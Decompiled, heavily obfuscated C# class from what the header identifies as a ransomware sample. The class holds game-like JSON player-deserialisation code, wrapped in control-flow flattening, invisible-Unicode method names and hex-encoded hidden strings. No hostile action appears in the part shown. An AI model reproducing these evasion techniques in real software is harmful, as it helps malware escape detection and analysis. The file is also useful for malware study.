// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: WhenAllPromi, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: EC39505B-F84A-4834-9FA9-F8C42A2FB5BC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fabdc6de70c953d03389a8cd60eaa852c968c6328b070b4049f01954433e9324.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      bool flag1 = BaseStream == 0;
label_1:
      int num1 = -1538206997;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -12001018)) % 13U)
        {
          case 0:
            num1 = (int) num2 * -569308929 ^ 1154527610;
            continue;
          case 1:
            int num3 = !flag1 ? -1129097120 : (num3 = -1451007166);
            num1 = num3 ^ (int) num2 * -1919036883;
            continue;
          case 2:
            flag2 = BaseStream == 1;
            num1 = -669389952;
            continue;
          case 3:
            num1 = (int) num2 * -675811161 ^ -110996515;
            continue;
          case 4:
            num1 = (int) num2 * -173519844 ^ -256865348;
            continue;
          case 5:
            str2 = str1;
            num1 = -1817527611;
            continue;
          case 7:
            num1 = (int) num2 * -1578571290 ^ 1656995824;
            continue;
          case 8:
            goto label_1;
          case 9:
            str1 = "52626A";
            num1 = (int) num2 * -1160942721 ^ 475686416;
            continue;
          case 10:
            num1 = (int) num2 * -1631825317 ^ 1298020030;
            continue;
          case 11:
            str1 = "4672616D6553656375726974794465736372697074";
            num1 = (int) num2 * -346653311 ^ -1636944119;
            continue;
          case 12:
            int num4 = !flag2 ? 1974912076 : (num4 = 1966053032);
            num1 = num4 ^ (int) num2 * -417333374;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -682123481;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1867205303)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -1796986080 ^ 16990965;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = -1905342592;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
        int index = 0;
label_1:
        int num2 = -99047712;
        bool flag;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -1257130781)) % 11U)
          {
            case 0:
              num3 = planningCards[index];
              num2 = -34101140;
              continue;
            case 1:
              ++num1;
              num2 = (int) num4 * -2000763789 ^ 1664567883;
              continue;
            case 2:
              int num5 = flag ? 1325199752 : (num5 = 1984998226);
              num2 = num5 ^ (int) num4 * 59118041;
              continue;
            case 3:
              planningCardsCount = num1;
              num2 = (int) num4 * -1154153254 ^ -924063472;
              continue;
            case 4:
              int num6;
              num2 = num6 = index < planningCards.Length ? -113933942 : (num6 = -178717896);
              continue;
            case 5:
              num2 = (int) num4 * -883279599 ^ 1822893179;
              continue;
            case 6:
              flag = num3 > 0;
              num2 = (int) num4 * -218679074 ^ -767061861;
              continue;
            case 7:
              ++index;
              num2 = (int) num4 * -1828459461 ^ 473978112;
              continue;
            case 8:
              goto label_1;
            case 9:
              num2 = -927179589;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -1510118802;
      string str1;
      string str2;
      bool flag;
      int index;
      int planningCard;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -931081076)) % 11U)
        {
          case 0:
            ++index;
            num1 = -1599349004;
            continue;
          case 1:
            flag = index < this.PlanningCards.Length;
            num1 = -1191029675;
            continue;
          case 2:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * -1215046257 ^ 1812488361;
            continue;
          case 3:
            str1 = Player.\u200C⁪‏‎‫⁪​‍⁭‌​‫‭⁯​​⁪‮⁮‎‪‭⁪‭‭⁭‌⁬⁫‫⁮‌⁬⁭⁫‪⁮‪⁪‌‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -278625075;
            continue;
          case 4:
            int num3 = flag ? -718201303 : (num3 = -60657247);
            num1 = num3 ^ (int) num2 * 1208279069;
            continue;
          case 5:
            str2 = str1;
            num1 = (int) num2 * 199227953 ^ -1787863584;
            continue;
          case 6:
            num1 = (int) num2 * 805226579 ^ 1810646542;
            continue;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * 1903173656 ^ 1583311996;
            continue;
          case 10:
            planningCard = this.PlanningCards[index];
            int num4;
            num1 = num4 = planningCard == 0 ? -447096483 : (num4 = -2053638709);
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 50258170;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 157037216)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -235747323 ^ 262716989;
            continue;
          case 3:
            num1 = (int) num2 * -1060188708 ^ 1037247337;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -913027623;
      int[] numArray;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -319309981)) % 10U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -79801436;
            continue;
          case 1:
            ++aIndex;
            num1 = (int) num2 * -1352115597 ^ 1919478840;
            continue;
          case 2:
            numArray = new int[count];
            num1 = (int) num2 * -704804770 ^ -1353030207;
            continue;
          case 3:
            goto label_1;
          case 5:
            num1 = (int) num2 * -388529361 ^ -352125264;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex < count ? -1948976861 : (num3 = -1141661998);
            continue;
          case 7:
            num1 = (int) num2 * -258294635 ^ 650780676;
            continue;
          case 8:
            aIndex = 0;
            num1 = (int) num2 * 1014977176 ^ 171234438;
            continue;
          case 9:
            planningCards = numArray;
            num1 = (int) num2 * 1891021983 ^ -746626871;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1043604091;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1263419864)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Player.\u200B‭‭‫​‪⁭⁭‮⁫‎‍‭‬⁭‎⁮‏⁯⁪‎⁭⁭‎⁭​‫​⁮‪‬‬‬‪⁬⁫‏‍​⁫‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -2137528077 ^ 409939384;
            continue;
          case 3:
            num1 = (int) num2 * -1368565071 ^ 1621890689;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200C⁪‏‎‫⁪​‍⁭‌​‫‭⁯​​⁪‮⁮‎‪‭⁪‭‭⁭‌⁬⁫‫⁮‌⁬⁭⁫‪⁮‪⁪‌‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200B‭‭‫​‪⁭⁭‮⁫‎‍‭‬⁭‎⁮‏⁯⁪‎⁭⁭‎⁭​‫​⁮‪‬‬‬‪⁬⁫‏‍​⁫‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
